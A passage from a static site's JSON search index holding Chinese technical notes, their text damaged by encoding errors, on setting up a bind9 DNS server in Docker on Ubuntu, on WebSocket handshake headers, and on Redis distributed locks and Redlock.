ubuntué…ç½®dns","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-index.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-index.html"},{"title":"ubuntué…ç½®dnsæœåŠ¡å™¨","text":"é…ç½®dnsæœåŠ¡å™¨ ä¸ºäº†æ–¹ä¾¿ç›´æ¥ä½¿ç”¨dockeréƒ¨ç½², å…ˆé…ç½®ä¸€ä¸ªdnsæœºå™¨(åç»­ä»¥ myubuntu_dns_server ä»£ç§°): # é»˜è®¤latestç‰ˆæœ¬æ˜¯ 20ç‰ˆæœ¬çš„ focal docker pull ubuntu docker run --name myubuntu_dns_server -itd ubuntu ç„¶åå°±éƒ¨ç½²å¥½ä¸€ä¸ªubuntuæœåŠ¡å™¨äº†, è¿›å…¥: docker exec -it myubuntu_dns_server /bin/bash é…ç½®aptæº: # å®‰è£…è¯ä¹¦éªŒè¯æ¨¡å—æ‰å¯ä»¥é…ç½®æº apt update && apt install ca-certificates mv /etc/apt/sources.list /etc/apt/sources.list.bak echo \"deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse \" > /etc/apt/sources.list apt update && apt install vim # å®‰è£…æŸ¥çœ‹ipå·¥å…· apt install iproute2 æŸ¥çœ‹ipä¸º 172.17.0.5 ip a | grep inet é…ç½®æ™®é€šæœºå™¨(å¯é€‰) å†æŒ‰ç…§ä¸Šè¿°æ–¹å¼å®‰è£…ä¸€ä¸ªæµ‹è¯•æœºå™¨(åç»­ä»¥ myubuntu_g1 ä»£ç§°), éªŒè¯dnsé…ç½®æ˜¯å¦æ­£ç¡®: docker run --name myubuntu_g1 -itd ubuntu # å‚è€ƒä¸Šé¢ ... # æŸ¥çœ‹ipä¸º 172.17.0.4 ip a | grep inet # å®‰è£… bind9-utils ä»¥ä½¿ç”¨host apt install bind9-utils host dns-serverç»§ç»­é…ç½® å®é™…è¿˜åº”è¯¥å›ºå®šæ­¤æœåŠ¡å™¨ipä¸ºé™æ€ip, æ­¤å¤„dockeréƒ¨ç½²å¿½ç•¥. dnsæœåŠ¡å™¨(myubuntu_dns_server)å®‰è£…bind9(ç›®å‰å¸‚é¢æ˜¯æœ€ä¸»æµçš„å¼€æºDNSè½¯ä»¶) apt install bind9 bind9é»˜è®¤ä¼šæœ‰ä¸€äº›é…ç½®æ–‡ä»¶, å‚è§ /docs/æ“ä½œç³»ç»Ÿ/linux/package/bind9è½¯ä»¶åŒ… é…ç½®option é…ç½®option: // å…è®¸è¿›è¡Œæ™®é€šæŸ¥è¯¢çš„ IP åœ°å€åˆ—è¡¨ï¼Œé»˜è®¤å…è®¸æ‰€æœ‰ï¼› sed -ie \"3a \\ \\ \\ \\ \\ \\ \\ \\ listen-on port 53 { ${ip}; }; allow-query { any; }; \" /etc/bind/named.conf.options å…¶å®å°±æ˜¯åŠ ä¸Š: listen-on port 53 { ${ip}; }; allow-query { any; }; å…¶ä¸­ listen-on å¿…é¡»é…ç½®, è®©namedçŸ¥é“ç›‘å¬çš„ç«¯å£ä¸åœ°å€. allow-query æ˜¯é»˜è®¤ any å¯ä»¥å¿½ç•¥ é…ç½®æ­£å‘è§£æ è‹¥é…ç½®typeä¸ºslave è‹¥éœ€è¦é…ç½®ä»æœåŠ¡å™¨, æ ¼å¼å‚è€ƒä¸‹é¢é…ç½®: zone \"aaa.com\" IN { type slave; // ä»æ¨¡å¼ masters { 172.17.0.5; }; // ä¸»æœåŠ¡å™¨çš„IP file \"slaves/aaa.localhost\"; allow-update { none; }; }; åœ¨ /etc/bind/named.conf.local æ·»åŠ ä»¥ä¸‹å†…å®¹: zone \"study.edu\" IN { type master; file \"/var/cache/bind/named.study.com\"; }; è¡¨ç¤ºé…ç½®ä¸€ä¸ª study.edu åŸŸå, ä½œä¸ºmaster, é…ç½®æ–‡ä»¶åœ¨ /var/cache/bind/named.study.com æŠ€å·§ å¯ç›´æ¥: cp /etc/bind/db.local /var/cache/bind/named.study.com ç„¶åä¿®æ”¹ ç°åœ¨é…ç½® /var/cache/bind/named.study.com ; ; BIND data file for study.com ; $TTL 604800 @ IN SOA study.com. root.study.com. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS localhost. @ IN A 172.17.0.4 @ IN AAAA ::1 ; A è¡¨ç¤ºipv4åœ°å€ AAAAè¡¨ç¤ºipv6åœ°å€ NSè¡¨ç¤ºä½¿ç”¨çš„dnsæœåŠ¡å™¨ ; www ä¼šè‡ªåŠ¨åŠ åˆ° study.com. å®é™…ä¸º www.study.com www IN A 172.17.0.4 ; qq ä¼šè‡ªåŠ¨åŠ åˆ° study.com. å®é™…ä¸º qq.study.com qq IN A 172.17.0.6 è­¦å‘Š è¿™ç§è§£æé…ç½®æ–‡ä»¶éœ€è¦æ³¨æ„ç©ºæ ¼é—®é¢˜, åˆ‡è®° å¦åˆ™å¯èƒ½ä¼šå‡ºç°è¿™ç§é—®é¢˜: Host 5.0.17.172.in-addr.arpa not found: 2(SERVFAIL) é‡å¯ bind9: /etc/init.d/named restart æµ‹è¯•: root@e376019130d3:/# host www.study.edu 172.17.0.5 Using domain server: Name: 172.17.0.5 Address: 172.17.0.5#53 Aliases: www.study.edu has address 172.17.0.4 root@e376019130d3:/# root@e376019130d3:/# root@e376019130d3:/# host qq.study.edu 172.17.0.5 Using domain server: Name: 172.17.0.5 Address: 172.17.0.5#53 Aliases: qq.study.edu has address 172.17.0.6 é…ç½®åå‘è§£æ è­¦å‘Š å¤šæ¬¡é…ç½®ä¸åŒçš„åå‘ä»£ç†, ä¸ç”¨é‡å¤å†™ /etc/bind/named.conf.local ä¸‹çš„ zone \"0.17.172.in-addr.arpa\" åœ¨ /etc/bind/named.conf.local å¢åŠ ä»¥ä¸‹å†…å®¹: zone \"0.17.172.in-addr.arpa\" { type master; file \"/var/cache/bind/named.reverse.db.xxx\"; }; æŠ€å·§ å¯ç›´æ¥: cp /etc/bind/db.127 /var/cache/bind/named.reverse.db.xxx ç„¶åä¿®æ”¹ ç°åœ¨é…ç½® /var/cache/bind/named.reverse.db.xxx ; ; BIND reverse data file for 172.17.0 ; $TTL 604800 @ IN SOA study.com. admin.study.com. ( 1 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS study.com. ; è¡¨ç¤º 172.17.0.5 ä¼šè¢«è§£æä¸º study.com. æ³¨æ„è¿™é‡Œéƒ½æ˜¯å€’ç€æ¥ 5 IN PTR study.com. é‡å¯: /etc/init.d/named restart æµ‹è¯•åå‘è§£æ: root@e376019130d3:/# root@e376019130d3:/# host 172.17.0.5 172.17.0.5 Using domain server: Name: 172.17.0.5 Address: 172.17.0.5#53 Aliases: 5.0.17.172.in-addr.arpa domain name pointer study.com. root@e376019130d3:/# æŠ€å·§ é…ç½®dnsè§£æåœ¨ /etc/resolv.conf æ–‡ä»¶, ä½œç”¨ç­‰åŒäºä¸Šé¢çš„ 172.17.0.5 , è‹¥å­˜åœ¨ç›¸åº”é…ç½®å°±, ä¸Šè¿°å‘½ä»¤å¯ä»¥ä¸ç”¨å†™æ­¤IP è®¾ç½®ä¸ºDNSç¼“å­˜æœåŠ¡å™¨ åœ¨ /etc/bind/named.conf.options å¢åŠ ä»¥ä¸‹å†…å®¹: allow-query { any; }; allow-query-cache { any; }; // å…è®¸æŸ¥è¯¢ç¼“å­˜çš„IPåœ°å€åˆ—è¡¨ï¼› recursion yes; // å…è®¸é€’å½’æŸ¥è¯¢ï¼› allow-recursion { any; }; // å…è®¸é€’å½’æŸ¥è¯¢çš„IPåœ°å€åˆ—è¡¨ï¼› forward only; // å…è®¸è½¬å‘ï¼› forwarders { 172.17.0.5; }; // è½¬å‘åˆ—è¡¨ï¼Œ172.17.0.5 ä¸ºå‰é¢é…ç½®çš„æˆæƒæœåŠ¡å™¨ï¼› dnssec-validation no; // å…³é—­ dnssecï¼› é‡å¯bind9: /etc/init.d/named restart éªŒè¯: # æ¸…é™¤dnsç¼“å­˜ rndc flush # +norecurse ä¸å…è®¸é€’å½’æŸ¥è¯¢ dig @172.17.0.4 www.study.com A +norecurse # åœ¨æˆæƒæœåŠ¡å™¨ä¸ŠæŠ“åŒ… tcpdump -i eth1 port 53 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes &#94;C 0 packets captured 0 packets received by filter 0 packets dropped by kernel ç„¶åå†åŸºäºå…è®¸é€’å½’æŸ¥è¯¢æŠ“åŒ…, å¯ä»¥çœ‹å‡º ç¼“å­˜æœåŠ¡å™¨å‘æˆæƒæœåŠ¡å™¨è¿›è¡Œé€’å½’æŸ¥è¯¢. ä¸å…è®¸é€’å½’æŸ¥è¯¢æ—¶ï¼ŒDNS ç¼“å­˜æœåŠ¡å™¨ä¼šå°†ç¼“å­˜ç»“æœå‘é€ç»™å®¢æˆ·ç«¯. æ­¤éƒ¨åˆ†ç¼“å­˜å‚è€ƒ:: Bind9ï¼šé…ç½® DNS æˆæƒæœåŠ¡å™¨å’Œ DNS ç¼“å­˜æœåŠ¡å™¨ é™„, åŸºç¡€é…ç½®è„šæœ¬, åŠŸèƒ½: é…ç½®æœ¬æœºä¸ºdnsæˆæƒæœåŠ¡å™¨","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-ubuntu-configuration-DNS.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-config_dns-ubuntu-configuration-DNS.html"},{"title":"è®¡ç®—æœºç½‘ç»œ","text":"å¤šæ’­åœ°å€ ç½‘ç»œä¸­çš„NATæ¨¡å¼ IPåœ°å€ä¸å­ç½‘åˆ’åˆ† HTTPè®¤è¯† ç½‘ç»œå¸¸è¯† å±€åŸŸç½‘å†…è·¨ç½‘æ®µè®¿é—® config_dns LANä¸WAN websocket åè®® upnpåè®®","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-index.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-index.html"},{"title":"websocket","text":"urlè¡¨ç¤ºå¸¸ä»¥ ws å¼€å¤´, æˆ– wss å¼€å¤´, å¦‚: wss://127.0.0.1:8080/ ws ä¸ wss åŒºåˆ«å°±æ˜¯åè€…å¤šäº†ä¸ªåŠ å¯†, å°±åƒ http ä¸ https ä¸€æ · åŒ…å«çš„æ¶ˆæ¯å¤´ Sec-Websocket-key WebSocketæ¡æ‰‹è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªå…³é”®æ¶ˆæ¯å¤´. æ ‡è¯†è¿™æ˜¯ä¸€ä¸ªWebSocketè¿æ¥è¯·æ±‚,è€Œä¸æ˜¯æ™®é€šçš„HTTPè¯·æ±‚ ç”¨æ¥è®¡ç®—Sec-WebSocket-Acceptçš„å€¼,ä»¥éªŒè¯è¿æ¥. åœ¨WebSocketæ¡æ‰‹æ—¶,å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚åˆ°æœåŠ¡å™¨,è¯·æ±‚ä¸­åŒ…å«ä¸€ä¸ªéšæœºç”Ÿæˆçš„Sec-WebSocket-Key. æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªkeyå,éœ€è¦æŒ‰ç…§ä¸€å®šç®—æ³•è®¡ç®—å‡ºä¸€ä¸ªhashå€¼,æ”¾åˆ°Sec-WebSocket-Acceptå“åº”å¤´ä¸­è¿”å›ç»™å®¢æˆ·ç«¯. å®¢æˆ·ç«¯æ”¶åˆ°å“åº”å,ä¼šç”¨ç›¸åŒçš„ç®—æ³•è®¡ç®—hashå€¼,å¹¶æ¯”å¯¹æ˜¯å¦å’ŒæœåŠ¡å™¨è¿”å›çš„ä¸€è‡´ã€‚å¦‚æœä¸€è‡´,åˆ™è¯´æ˜æœåŠ¡å™¨æ”¯æŒWebSocket,æ¡æ‰‹æˆåŠŸ. è¿™ä¸ªè¿‡ç¨‹å¯ä»¥é˜²æ­¢æ™®é€šHTTPå®¢æˆ·ç«¯æ„å¤–æ¥å…¥WebSocketæœåŠ¡å™¨.","tags":"è®¡ç®—æœºç½‘ç»œ","url":"/yq-doc-source-docs-Chaotic-computer-network-websocket.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-websocket.html"},{"title":"åˆ†å¸ƒå¼é”","text":"å‚è€ƒ: Redis åˆ†å¸ƒå¼é”çš„æ­£ç¡®å®ç°åŸç†æ¼”åŒ–å†ç¨‹ä¸ Redisson å®æˆ˜æ€»ç»“ åˆ†å¸ƒå¼é”åº”è¯¥æ»¡è¶³å“ªäº›ç‰¹æ€§ äº’æ–¥ï¼šåœ¨ä»»ä½•ç»™å®šæ—¶åˆ»ï¼Œåªæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥æŒæœ‰é”ï¼› æ— æ­»é”ï¼šä»»ä½•æ—¶åˆ»éƒ½æœ‰å¯èƒ½è·å¾—é”ï¼Œå³ä½¿è·å–é”çš„å®¢æˆ·ç«¯å´©æºƒï¼› å®¹é”™ï¼šåªè¦å¤§å¤šæ•° Redisçš„èŠ‚ç‚¹éƒ½å·²ç»å¯åŠ¨ï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥è·å–å’Œé‡Šæ”¾é”ã€‚ å¦‚ä½•è®¾ç½®? æ™®é€šæ’ä»–é” åˆ©ç”¨ /docs/æ•°æ®åº“/redis/redis çš„ç‰¹æ€§: ä½¿ç”¨ SETNX key value å‘½ä»¤æ˜¯å®ç°ã€Œäº’æ–¥ã€ç‰¹æ€§ å¦‚è·å–ä¸€ä¸ªè®¢å•é”: 127.0.0.1:6379> setnx lock:order_1 1 (integer) 1 é‡å¤è·å–å°±å¤±è´¥: 127.0.0.1:6379> setnx lock:order_1 2 (integer) 0 ä½†æ˜¯ä¼šå­˜åœ¨ä¸€ä¸ªé—®é¢˜, ä¼šå‡ºç°å¦‚æœå®¢æˆ·ç«¯å¼‚å¸¸, é”æ— æ³•é‡Šæ”¾, å°±ä¼šæœ‰æ­»é”. è¿™ä¸ªæ—¶å€™å¯ä»¥è®¾ç½®è¶…æ—¶, å¦‚30ç§’è¿‡æœŸ: 127.0.0.1:6379> expire lock:order_1 30 (integer) 1 ä½†æ˜¯è¿™æ ·å†™æœ‰ä¸ªé—®é¢˜, å› ä¸ºæ˜¯ä¸¤ä¸ªå‘½ä»¤, ä¸èƒ½ä¿è¯åŒæ—¶æ‰§è¡ŒæˆåŠŸ(åŸå­æ€§) æ‰€æœ‰å¯ä»¥è¿™æ ·å†™: 127.0.0.1:6379> set lock:order_1 1 NX EX 30 OK è¿™æ ·å†™è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜è¦é˜²æ­¢ä¸èƒ½é‡Šæ”¾ä¸æ˜¯è‡ªå·±åŠ çš„é”, æ¯”å¦‚æ˜¯Aè®¾ç½®çš„, Bç»™deläº†. è€ƒè™‘ä»¥ä¸‹åœºæ™¯: A è·å–é”æˆåŠŸå¹¶è®¾ç½®è®¾ç½® 30 ç§’è¶…æ—¶ï¼› A å› ä¸ºä¸€äº›åŸå› å¯¼è‡´æ‰§è¡Œå¾ˆæ…¢ï¼ˆç½‘ç»œé—®é¢˜ã€å‘ç”Ÿ FullGCâ€¦â€¦ï¼‰ï¼Œè¿‡äº† 30 ç§’ä¾ç„¶æ²¡æ‰§è¡Œå®Œï¼Œä½†æ˜¯é”è¿‡æœŸã€Œè‡ªåŠ¨é‡Šæ”¾äº†ã€ï¼› B ç”³è¯·åŠ é”æˆåŠŸï¼› A æ‰§è¡Œå®Œæˆï¼Œæ‰§è¡Œ DEL é‡Šæ”¾é”æŒ‡ä»¤ï¼Œè¿™ä¸ªæ—¶å€™å°±æŠŠ B çš„é”ç»™é‡Šæ”¾äº†ã€‚ æœ‰ä¸ªå…³é”®é—®é¢˜éœ€è¦è§£å†³ï¼šè‡ªå·±çš„é”åªèƒ½è‡ªå·±æ¥é‡Šæ”¾ è¿™ä¸ªæ—¶å€™å¯ä»¥ä»valueä¸Šå…¥æ‰‹, æ¯”å¦‚è®¾ç½®å…¶å‰ç¼€ä¸ºè‡ªå·±çš„æ ‡è¯†, delå‰æ£€æŸ¥ä¸€ä¸‹æ˜¯ä¸æ˜¯è‡ªå·±çš„é” è¿™ä¸ªæ—¶å€™å·²ç»æ¯”è¾ƒå®Œç¾äº†, ä¸€èˆ¬éƒ½æ˜¯å¦‚æ­¤ä½¿ç”¨ æ­£ç¡®è®¾ç½®é”è¶…æ—¶ é”çš„è¶…æ—¶æ—¶é—´æ€ä¹ˆè®¡ç®—åˆé€‚å‘¢ï¼Ÿ è¿™ä¸ªæ—¶é—´ä¸èƒ½çå†™ï¼Œä¸€èˆ¬è¦æ ¹æ®åœ¨æµ‹è¯•ç¯å¢ƒå¤šæ¬¡æµ‹è¯•ï¼Œç„¶åå‹æµ‹å¤šè½®ä¹‹åï¼Œæ¯”å¦‚è®¡ç®—å‡ºå¹³å‡æ‰§è¡Œæ—¶é—´ 200 msã€‚ é‚£ä¹ˆé”çš„è¶…æ—¶æ—¶é—´å°±æ”¾å¤§ä¸ºå¹³å‡æ‰§è¡Œæ—¶é—´çš„ 3~5 å€ã€‚ ä¸ºå•¥è¦æ”¾æ”¾å¤§å‘¢ï¼Ÿ å› ä¸ºå¦‚æœé”çš„æ“ä½œé€»è¾‘ä¸­æœ‰ç½‘ç»œ IO æ“ä½œã€JVM FullGC ç­‰ï¼Œçº¿ä¸Šçš„ç½‘ç»œä¸ä¼šæ€»ä¸€å¸†é£é¡ºï¼Œæˆ‘ä»¬è¦ç»™ç½‘ç»œæŠ–åŠ¨ç•™æœ‰ç¼“å†²æ—¶é—´ã€‚ é‚£æˆ‘è®¾ç½®æ›´å¤§ä¸€ç‚¹ï¼Œæ¯”å¦‚è®¾ç½® 1 å°æ—¶ä¸æ˜¯æ›´å®‰å…¨ï¼Ÿ ä¸è¦é’»ç‰›è§’ï¼Œå¤šå¤§ç®—å¤§ï¼Ÿ è®¾ç½®æ—¶é—´è¿‡é•¿ï¼Œä¸€æ—¦å‘ç”Ÿå®•æœºé‡å¯ï¼Œå°±æ„å‘³ç€ 1 å°æ—¶å†…ï¼Œåˆ†å¸ƒå¼é”çš„æœåŠ¡å…¨éƒ¨èŠ‚ç‚¹ä¸å¯ç”¨ã€‚ ä½ è¦è®©è¿ç»´æ‰‹åŠ¨åˆ é™¤è¿™ä¸ªé”ä¹ˆï¼Ÿ åªè¦è¿ç»´çœŸçš„ä¸ä¼šæ‰“ä½ ã€‚ æœ‰æ²¡æœ‰å®Œç¾çš„æ–¹æ¡ˆå‘¢ï¼Ÿä¸ç®¡æ—¶é—´æ€ä¹ˆè®¾ç½®éƒ½ä¸å¤§åˆé€‚ã€‚ æˆ‘ä»¬å¯ä»¥è®©è·å¾—é”çš„çº¿ç¨‹å¼€å¯ä¸€ä¸ªå®ˆæŠ¤çº¿ç¨‹ï¼Œç”¨æ¥ç»™å¿«è¦è¿‡æœŸçš„é”ã€Œç»­èˆªã€ã€‚ åŠ é”çš„æ—¶å€™è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼ŒåŒæ—¶å®¢æˆ·ç«¯å¼€å¯ä¸€ä¸ªã€Œå®ˆæŠ¤çº¿ç¨‹ã€ï¼Œå®šæ—¶å»æ£€æµ‹è¿™ä¸ªé”çš„å¤±æ•ˆæ—¶é—´ã€‚ å¦‚æœå¿«è¦è¿‡æœŸï¼Œä½†æ˜¯ä¸šåŠ¡é€»è¾‘è¿˜æ²¡æ‰§è¡Œå®Œæˆï¼Œè‡ªåŠ¨å¯¹è¿™ä¸ªé”è¿›è¡Œç»­æœŸï¼Œé‡æ–°è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚ è¿™ä¸ªé“ç†è¡Œå¾—é€šï¼Œå¯æˆ‘å†™ä¸å‡ºã€‚ åˆ«æ…Œï¼Œå·²ç»æœ‰ä¸€ä¸ªåº“æŠŠè¿™äº›å·¥ä½œéƒ½å°è£…å¥½äº†ä»–å« Redisson . åœ¨ä½¿ç”¨åˆ†å¸ƒå¼é”æ—¶ï¼Œå®ƒå°±é‡‡ç”¨äº† è‡ªåŠ¨ç»­æœŸ çš„æ–¹æ¡ˆæ¥é¿å…é”è¿‡æœŸï¼Œè¿™ä¸ªå®ˆæŠ¤çº¿ç¨‹æˆ‘ä»¬ä¸€èˆ¬ä¹ŸæŠŠå®ƒå«åš çœ‹é—¨ç‹— çº¿ç¨‹ã€‚ ä¸€è·¯ä¼˜åŒ–ä¸‹æ¥ï¼Œæ–¹æ¡ˆä¼¼ä¹æ¯”è¾ƒã€Œä¸¥è°¨ã€äº†ï¼ŒæŠ½è±¡å‡ºå¯¹åº”çš„æ¨¡å‹å¦‚ä¸‹ é€šè¿‡ SET lock_resource_name random_value NX EX expire_timeï¼ŒåŒæ—¶å¯åŠ¨å®ˆæŠ¤çº¿ç¨‹ä¸ºå¿«è¦è¿‡æœŸä½†è¿˜æ²¡æ‰§è¡Œå®Œçš„å®¢æˆ·ç«¯çš„é”ç»­å‘½; å®¢æˆ·ç«¯æ‰§è¡Œä¸šåŠ¡é€»è¾‘æ“ä½œå…±äº«èµ„æºï¼› é€šè¿‡è„šæœ¬é‡Šæ”¾é”ï¼Œå…ˆ get åˆ¤æ–­é”æ˜¯å¦æ˜¯è‡ªå·±åŠ çš„ï¼Œå†æ‰§è¡Œ DELã€‚ ä½†æ˜¯è¿˜æ˜¯æœ‰ä»¥ä¸‹é—®é¢˜ å¯é‡å…¥é”å¦‚ä½•å®ç°ï¼Ÿ ä¸»ä»æ¶æ„å´©æºƒæ¢å¤å¯¼è‡´é”ä¸¢å¤±å¦‚ä½•è§£å†³ï¼Ÿ å®¢æˆ·ç«¯åŠ é”çš„ä½ç½®æœ‰é—¨é“ä¹ˆï¼Ÿ å®ç°å¯é‡å…¥é” å½“ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œä¸€æ®µä»£ç æˆåŠŸè·å–é”ä¹‹åï¼Œç»§ç»­æ‰§è¡Œæ—¶ï¼Œ åˆé‡åˆ°åŠ é”çš„ä»£ç ï¼Œå¯é‡å…¥æ€§å°±å°±ä¿è¯çº¿ç¨‹èƒ½ç»§ç»­æ‰§è¡Œï¼Œ è€Œä¸å¯é‡å…¥å°±æ˜¯éœ€è¦ç­‰å¾…é”é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡è·å–é”æˆåŠŸï¼Œæ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ Redis Hash å¯é‡å…¥é” Redisson ç±»åº“å°±æ˜¯é€šè¿‡ Redis Hash æ¥å®ç°å¯é‡å…¥é” å½“çº¿ç¨‹æ‹¥æœ‰é”ä¹‹åï¼Œå¾€åå†é‡åˆ°åŠ é”æ–¹æ³•ï¼Œç›´æ¥å°†åŠ é”æ¬¡æ•°åŠ  1ï¼Œç„¶åå†æ‰§è¡Œæ–¹æ³•é€»è¾‘ã€‚ é€€å‡ºåŠ é”æ–¹æ³•ä¹‹åï¼ŒåŠ é”æ¬¡æ•°å†å‡ 1ï¼Œå½“åŠ é”æ¬¡æ•°ä¸º 0 æ—¶ï¼Œé”æ‰è¢«çœŸæ­£çš„é‡Šæ”¾ã€‚ å¯ä»¥çœ‹åˆ°å¯é‡å…¥é”æœ€å¤§ç‰¹æ€§å°±æ˜¯è®¡æ•°ï¼Œè®¡ç®—åŠ é”çš„æ¬¡æ•°ã€‚ æ‰€ä»¥å½“å¯é‡å…¥é”éœ€è¦åœ¨åˆ†å¸ƒå¼ç¯å¢ƒå®ç°æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå°±éœ€è¦ç»Ÿè®¡åŠ é”æ¬¡æ•°ã€‚ å¤§è‡´é€»è¾‘: é¦–å…ˆ Redis exists å‘½ä»¤åˆ¤æ–­å½“å‰ lock è¿™ä¸ªé”æ˜¯å¦å­˜åœ¨ å¦‚æœé”ä¸å­˜åœ¨çš„è¯ï¼Œç›´æ¥ä½¿ç”¨ hincrby åˆ›å»ºä¸€ä¸ªé”®ä¸º lock hash è¡¨ï¼Œ å¹¶ä¸”ä¸º Hash è¡¨ä¸­é”®ä¸º uuid åˆå§‹åŒ–ä¸º 0ï¼Œç„¶åå†æ¬¡åŠ  1ï¼Œæœ€åå†è®¾ç½®è¿‡æœŸæ—¶é—´ å¦‚æœå½“å‰é”å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨ hexists åˆ¤æ–­å½“å‰ lock å¯¹åº”çš„ hash è¡¨ä¸­æ˜¯å¦å­˜åœ¨ uuid è¿™ä¸ªé”®ï¼Œ å¦‚æœå­˜åœ¨ï¼Œå†æ¬¡ä½¿ç”¨ hincrby åŠ  1ï¼Œæœ€åå†æ¬¡è®¾ç½®è¿‡æœŸæ—¶é—´ æœ€åå¦‚æœä¸Šè¿°ä¸¤ä¸ªé€»è¾‘éƒ½ä¸ç¬¦åˆï¼Œè¯´æ˜åˆ«äººæ‹¿äº†é”. ä¸»ä»æ¶æ„å¸¦æ¥çš„é—®é¢˜ ä¹‹å‰åˆ†æçš„åœºæ™¯éƒ½æ˜¯ï¼Œé”åœ¨ã€Œå•ä¸ªã€Redis å®ä¾‹ä¸­å¯èƒ½äº§ç”Ÿçš„é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æ¶‰åŠåˆ° Redis ä¸»ä»æ¨¡å¼å¯¼è‡´çš„é—®é¢˜ã€‚ æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ã€ŒCluster é›†ç¾¤ã€æˆ–è€…ã€Œå“¨å…µé›†ç¾¤ã€çš„æ¨¡å¼éƒ¨ç½²ä¿è¯é«˜å¯ç”¨ã€‚ è¿™ä¸¤ä¸ªæ¨¡å¼éƒ½æ˜¯åŸºäºã€Œä¸»ä»æ¶æ„æ•°æ®åŒæ­¥å¤åˆ¶ã€å®ç°çš„æ•°æ®åŒæ­¥ï¼Œè€Œ Redis çš„ä¸»ä»å¤åˆ¶é»˜è®¤æ˜¯å¼‚æ­¥çš„ã€‚ ä»¥ä¸‹å†…å®¹æ¥è‡ªäºå®˜æ–¹æ–‡æ¡£ Rediså®˜æ–¹ æˆ‘ä»¬è¯•æƒ³ä¸‹å¦‚ä¸‹åœºæ™¯ä¼šå‘ç”Ÿä»€ä¹ˆé—®é¢˜ï¼š å®¢æˆ·ç«¯ A åœ¨ master èŠ‚ç‚¹è·å–é”æˆåŠŸã€‚ è¿˜æ²¡æœ‰æŠŠè·å–é”çš„ä¿¡æ¯åŒæ­¥åˆ° slave çš„æ—¶å€™ï¼Œmaster å®•æœºã€‚ slave è¢«é€‰ä¸¾ä¸ºæ–° masterï¼Œè¿™æ—¶å€™æ²¡æœ‰å®¢æˆ·ç«¯ A è·å–é”çš„æ•°æ®ã€‚ å®¢æˆ·ç«¯ B å°±èƒ½æˆåŠŸçš„è·å¾—å®¢æˆ·ç«¯ A æŒæœ‰çš„é”ï¼Œè¿èƒŒäº†åˆ†å¸ƒå¼é”å®šä¹‰çš„äº’æ–¥ã€‚ è™½ç„¶è¿™ä¸ªæ¦‚ç‡æä½ï¼Œä½†æ˜¯æˆ‘ä»¬å¿…é¡»å¾—æ‰¿è®¤è¿™ä¸ªé£é™©çš„å­˜åœ¨ã€‚ âRedis çš„ä½œè€…æå‡ºäº†ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œå« Redlockï¼ˆçº¢é”ï¼‰ Redis çš„ä½œè€…ä¸ºäº†ç»Ÿä¸€åˆ†å¸ƒå¼é”çš„æ ‡å‡†ï¼Œæäº†ä¸€ä¸ª Redlockï¼Œ ç®—æ˜¯ Redis å®˜æ–¹å¯¹äºå®ç°åˆ†å¸ƒå¼é”çš„æŒ‡å¯¼è§„èŒƒ, Rediså®˜æ–¹ , ä½†æ˜¯è¿™ä¸ª Redlock ä¹Ÿè¢«å›½å¤–çš„ä¸€äº›åˆ†å¸ƒå¼ä¸“å®¶ç»™å–·äº†ã€‚ å› ä¸ºå®ƒä¹Ÿä¸å®Œç¾ï¼Œæœ‰\"æ¼æ´\"ã€‚ ä»€ä¹ˆæ˜¯ Redlock å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£( Rediså®˜æ–¹ )ï¼Œä»¥ä¸‹æ¥è‡ªå®˜æ–¹æ–‡æ¡£çš„ç¿»è¯‘ã€‚ æƒ³ç”¨ä½¿ç”¨ Redlockï¼Œå®˜æ–¹å»ºè®®åœ¨ä¸åŒæœºå™¨ä¸Šéƒ¨ç½² 5 ä¸ª Redis ä¸»èŠ‚ç‚¹ï¼Œ èŠ‚ç‚¹éƒ½æ˜¯å®Œå…¨ç‹¬ç«‹ï¼Œä¹Ÿä¸ä½¿ç”¨ä¸»ä»å¤åˆ¶ï¼Œä½¿ç”¨å¤šä¸ªèŠ‚ç‚¹æ˜¯ä¸ºå®¹é”™ã€‚ ä¸€ä¸ªå®¢æˆ·ç«¯è¦è·å–é”æœ‰ 5 ä¸ªæ­¥éª¤ï¼š å®¢æˆ·ç«¯è·å–å½“å‰æ—¶é—´ T1ï¼ˆæ¯«ç§’çº§åˆ«ï¼‰ï¼› ä½¿ç”¨ç›¸åŒçš„ keyå’Œ valueé¡ºåºå°è¯•ä» Nä¸ª Rediså®ä¾‹ä¸Šè·å–é”ã€‚ 